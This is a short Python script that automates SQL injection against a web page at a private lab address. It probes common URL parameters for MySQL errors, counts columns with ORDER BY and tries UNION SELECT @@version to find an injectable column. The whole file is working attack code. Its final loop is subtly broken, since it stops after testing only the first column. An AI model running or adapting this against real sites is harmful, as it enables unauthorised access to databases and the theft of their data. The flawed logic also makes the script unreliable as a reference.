import requests

ip_addr = "http://192.168.47.130/cat.php" #<-- change this to test target
lyst=["?id=","?cat=","?dir=","?action=","?board=","?date=","?detail=","?file=","?download=","?path=","?folder=","?prefix=","?include=","?page=","?inc=","?locate=","?show=","?doc=","?site="]
count = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20"]
i = "You have an error in your SQL syntax"

# Check for possible SQL injection
for element in lyst:
    url = ip_addr+element
    r = requests.get(url+"'")
    r = r.text
    if i in r:
        print('possible sql injection, checking for amount of columns')
        break

# Get the correct number of usable columns using ORDER BY 
for x in (count):
    page = (url+"1 ORDER BY "+x)
    r = requests.get(page)
    r = r.text
    if "Unknown column" in r:
        x = (int(x))
        x = (x-1)
        print(x,"number of columns usable")
        break


# Replace one of the values with @@version on each iteration
for i in range(1, x+1):
    values = ["1"]*x
    values[i-1] = "@@version"
    query = url + "1 UNION SELECT " + ",".join(values) + "--"
    r = requests.get(query)
    if "MariaDB"  in r.text:
        print("Column", (i), "is injectable")
        break 
    else:
        print("no columns are injectable")
        break
